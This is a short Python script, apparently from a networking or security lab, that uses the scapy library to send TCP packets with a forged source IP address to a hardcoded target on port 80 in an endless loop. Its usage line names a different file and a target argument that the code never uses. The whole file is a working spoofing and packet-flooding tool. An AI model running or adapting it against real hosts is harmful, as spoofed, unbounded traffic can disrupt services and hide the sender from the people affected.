#! /usr/bin/env python

# ipSpoofing.py:	IP-SPOOFS a target

# SYNTAX:	python ARPing2tex.py <TARGET_IP>

##########################################################################################################
##########################################################################################################
##########################################################################################################

from scapy.all import *

# Spoofed SRC.IP
A = "192.168.20.50"
# DST.IP-Target
B = "192.168.20.2"
# SRC.Port
C = RandShort()
# DST.Port
D = 80
# Packet Payload
payload = "hiya stranger!"

while True:
	spoofed_packet = IP(src=A, dst=B)/TCP(sport=C, dport=D)/payload
	send(spoofed_packet)
